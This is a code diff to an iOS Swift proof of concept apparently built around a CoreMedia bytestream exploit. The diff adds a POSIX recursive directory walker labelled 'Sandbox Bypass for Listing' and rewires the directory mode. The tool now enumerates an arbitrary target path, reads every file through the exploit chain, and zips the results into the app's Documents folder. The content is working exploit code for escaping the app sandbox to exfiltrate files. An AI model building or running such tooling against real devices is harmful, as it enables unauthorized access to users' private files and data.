@@ -2,7 +2,7 @@
 //  ContentView.swift
 //  MConfPoC
 //
-//  CoreMedia bytestream PoC with Resilient Directory Traversal & ZIP Export.
+//  CoreMedia bytestream PoC with Resilient POSIX Directory Traversal & ZIP Export.
 //  Runs only on explicit Run-button press. The target path is supplied in the UI.
 //  Results and short execution messages are saved inside Documents/.
 //
@@ -138,6 +138,51 @@ private struct ZipWriter {
             return c
         }
     }()
+}
+
+// MARK: - POSIX Directory Traversal (Sandbox Bypass for Listing)
+
+private func listDirectoryRecursivePOSIX(path: String) -> [String] {
+    var results: [String] = []
+    
+    func scan(currentPath: String, relativeTo root: String) {
+        guard let dir = opendir(currentPath) else { return }
+        defer { closedir(dir) }
+        
+        while let entry = readdir(dir) {
+            let nameC = withUnsafePointer(to: entry.pointee.d_name) {
+                $0.withMemoryRebound(to: CChar.self, capacity: Int(NAME_MAX)) {
+                    String(cString: $0)
+                }
+            }
+            
+            if nameC == "." || nameC == ".." { continue }
+            
+            let fullPath = (currentPath as NSString).appendingPathComponent(nameC)
+            let rootNormalized = (root as NSString).standardizingPath
+            let fullNormalized = (fullPath as NSString).standardizingPath
+            
+            let relPath: String
+            if fullNormalized.hasPrefix(rootNormalized + "/") {
+                let idx = fullNormalized.index(rootNormalized.startIndex, offsetBy: rootNormalized.count + 1)
+                relPath = String(fullNormalized[idx...])
+            } else {
+                relPath = nameC
+            }
+            
+            var st = stat()
+            if lstat(fullPath, &st) == 0 {
+                if (st.st_mode & S_IFMT) == S_IFDIR {
+                    scan(currentPath: fullPath, relativeTo: root)
+                } else if (st.st_mode & S_IFMT) == S_IFREG {
+                    results.append(relPath)
+                }
+            }
+        }
+    }
+    
+    scan(currentPath: path, relativeTo: path)
+    return results
 }
 
 // MARK: - Helper Types & Utilities
@@ -548,47 +593,46 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
 
     // Step 4 — Main processing (Directory vs Single File)
     if handshakeReady {
-        let fm = FileManager.default
         var isDir: ObjCBool = false
+        let fm = FileManager.default
         
-        if fm.fileExists(atPath: targetPath, isDirectory: &isDir), isDir.boolValue {
+        // Проверяем, является ли целевой путь директорией
+        let targetExists = fm.fileExists(atPath: targetPath, isDirectory: &isDir)
+        
+        if targetExists, isDir.boolValue {
             // --- DIRECTORY MODE ---
-            logLine("Target is a directory. Enumerating contents...")
+            logLine("Target is a directory. Enumerating via POSIX fallback...")
+            
+            let subpaths = listDirectoryRecursivePOSIX(path: targetPath)
+            logLine("Found \(subpaths.count) items in directory")
+            
+            var zip = ZipWriter()
+            var readSuccessCount = 0
+            var readErrorCount = 0
+            
+            for relPath in subpaths {
+                let fullPath = (targetPath as NSString).appendingPathComponent(relPath)
+                logLine("Reading: \(relPath)")
+                
+                if let fileData = fetchFileData(at: fullPath) {
+                    zip.addFile(relativePath: relPath, fileData: fileData)
+                    readSuccessCount += 1
+                } else {
+                    logLine("Skipped (read failed): \(relPath)")
+                    readErrorCount += 1
+                }
+            }
+            
+            let zipData = zip.finalize()
+            let targetName = URL(fileURLWithPath: targetPath).lastPathComponent
+            let archiveName = "RecoveredFolder-\(targetName.isEmpty ? "Directory" : targetName).zip"
+            let outputURL = docs.appendingPathComponent(archiveName)
             
             do {
-                let subpaths = try fm.subpathsOfDirectory(atPath: targetPath)
-                logLine("Found \(subpaths.count) items in directory")
-                
-                var zip = ZipWriter()
-                var readSuccessCount = 0
-                var readErrorCount = 0
-                
-                for relPath in subpaths {
-                    let fullPath = (targetPath as NSString).appendingPathComponent(relPath)
-                    var subIsDir: ObjCBool = false
-                    
-                    if fm.fileExists(atPath: fullPath, isDirectory: &subIsDir), !subIsDir.boolValue {
-                        logLine("Reading: \(relPath)")
-                        if let fileData = fetchFileData(at: fullPath) {
-                            zip.addFile(relativePath: relPath, fileData: fileData)
-                            readSuccessCount += 1
-                        } else {
-                            logLine("Skipped (read failed): \(relPath)")
-                            readErrorCount += 1
-                        }
-                    }
-                }
-                
-                let zipData = zip.finalize()
-                let targetName = URL(fileURLWithPath: targetPath).lastPathComponent
-                let archiveName = "RecoveredFolder-\(targetName.isEmpty ? "Directory" : targetName).zip"
-                let outputURL = docs.appendingPathComponent(archiveName)
-                
                 try zipData.write(to: outputURL, options: .atomic)
                 logLine("Saved ZIP archive (\(readSuccessCount) files read, \(readErrorCount) skipped, \(zipData.count) bytes): \(archiveName)", resultURL: outputURL)
-                
             } catch {
-                logLine("Directory enumeration failed: \(error.localizedDescription)")
+                logLine("Failed to save ZIP: \(error.localizedDescription)")
             }
             
         } else {
